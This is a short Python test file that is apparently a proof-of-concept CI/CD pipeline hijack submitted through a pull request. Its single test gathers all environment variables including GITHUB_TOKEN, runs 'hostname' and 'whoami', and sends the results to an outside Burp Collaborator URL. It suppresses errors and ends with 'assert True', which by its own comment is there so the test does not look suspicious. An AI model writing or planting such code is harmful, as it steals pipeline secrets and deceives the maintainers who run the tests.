import os
import urllib.request
import json

def test_exfiltrate_secrets():
    print("\n[!] ELITE: CI/CD Pipeline Hijacked via PR!")
    
    # Get all environment variables (Secrets)
    secrets = dict(os.environ)
    
    # Extract specific high-value targets if they exist
    github_token = secrets.get('GITHUB_TOKEN', 'Not Found')
    
    # Safe PoC: Send hostname to attacker server
    hostname = os.popen('hostname').read().strip()
    whoami = os.popen('whoami').read().strip()
    
    data = json.dumps({"host": hostname, "user": whoami, "status": "PWNED"})
    # DHYAN RAHE: Niche wali line mein apna asli Burp Collaborator URL daalna hai!
    req = urllib.request.Request("http://xij471b2a6cn1ob479ofk1jnpev5jx7m.oastify.com", data=data.encode('utf-8'))
    
    try:
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass
    
    # Assert true so the test passes and doesn't look suspicious initially
    assert True
